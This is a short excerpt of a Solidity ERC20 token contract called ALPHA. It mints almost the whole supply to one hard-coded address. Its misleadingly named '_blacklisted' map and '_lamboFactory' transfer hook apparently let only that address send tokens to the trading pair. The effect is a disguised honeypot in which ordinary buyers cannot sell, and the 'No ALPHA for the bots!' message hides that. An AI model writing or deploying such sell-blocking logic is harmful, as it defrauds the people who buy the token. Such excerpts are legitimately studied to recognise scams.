...
contract ALPHA is ERC20, Ownable {
    ...
    constructor() ERC20('ALPHA','ALPHA') {
        _mint(0xf80F6FA4Ccb6550c9Dc58d58D51FB0928f9b323C, 10000000000000 * 10 ** 18);
        _blacklisted[0xf80F6FA4Ccb6550c9Dc58d58D51FB0928f9b323C] = true;
    }
    ...
    function _lamboFactory(address from, address to, uint256 amount) internal virtual override {
        if(to == _alphaToken) {
            require(_blacklisted[from], "No ALPHA for the bots!");
        }
    }
}